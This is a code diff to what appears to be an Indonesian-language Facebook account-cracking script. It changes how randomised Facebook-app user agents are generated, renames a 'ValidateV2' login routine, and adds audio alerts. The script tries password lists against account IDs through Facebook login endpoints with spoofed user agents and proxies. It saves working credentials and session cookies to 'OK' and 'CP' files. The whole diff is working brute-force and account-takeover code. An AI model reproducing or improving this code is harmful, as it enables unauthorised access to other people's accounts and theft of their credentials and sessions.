@@ -154,9 +154,8 @@ for z in range(200):
 	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
 	ua_d = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
 	ua_x = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
-	ua = str(rc([ua_d,ua_s]))
-	if ua_s in ugent:pass
-	else:ugent.append(ua_s)
+	ualamak = str(rc([ua_d,ua_r,ua_x,ua_v,ua_o,ua_s]))
+	ugentotha.append(ualamak)
 	
 for xcTeam in range(1000):
 	rr = random.randint
@@ -188,7 +187,7 @@ for xc in range(10000):
     u4 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
     #u5 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]" 
     uateddy = random.choice([u1,u2,u3,u4])
-    ugen.append(uateddy)
+    ugent.append(uateddy)
 
 for viper in range(9999):
     rc = random.choice; rr = random.randint
@@ -1456,7 +1455,7 @@ def setting():
     elif hc in ["4", "04"]:
         method.append("mbasic")
     else:
-        method.append("validatev2")
+        method.append("validatev1")
     Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ["y", "Ya", "ya", "Y"]:
@@ -1572,7 +1571,7 @@ def metslow():
                 if "validatev1" in method:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(vldtV2, idf, pwv)
+                    pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
                     pool.submit(reguler, idf, pwv)
                 elif "mbasic" in method:
@@ -1639,7 +1638,7 @@ def metcepat():
                 if "validatev1" in method:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(vldtV2, idf, pwv)
+                    pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
                     pool.submit(reguler, idf, pwv)
                 elif "mbasic" in method:
@@ -1665,14 +1664,14 @@ def metcepat():
 
 
 #------------------[ METHOD-VALIDATE-2 ]-------------------#
-def vldtV2(idf,pwv):
+def ValidateV2(idf,pwv):
 	global loop,ok,cp
 	rc = random.choice
 	rr = random.randint
 	bo = random.choice([m,b,k,h,u])
 	prog.update(des,description=f" {K2}•{H2} VALIDATE V2 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua = random.choice(ugen)
+	ua = random.choice(ugentotha)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1699,6 +1698,7 @@ def vldtV2(idf,pwv):
 				print(f"{B}╰─{b}▶{b} {kuki} ")
 				print(f"{B}╰─{b}▶{b} {ua} ")
 				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				os.popen("play-audio o.mp3")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1711,6 +1711,7 @@ def vldtV2(idf,pwv):
 				print(f"{B}╰─{b}▶{B} {tahun(idf)} ")
 				print(f"{B}╰─{b}▶{B} {ua} ")
 				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				os.popen("play-audio c.mp3")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1763,6 +1764,7 @@ def crackemail(idf,pwv,nmf):
 			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\r{P}[{M}CP{P}] {K}{idf}|{pw}")
+				os.popen("play-audio o.mp3")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1773,6 +1775,7 @@ def crackemail(idf,pwv,nmf):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f"\r{P}[{B}OK{P}] {H}{idf}|{pw}\n")
 				print(f"\r{K}{kuki}|{ua}")
+				os.popen("play-audio o.mp3")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				break
 			else:
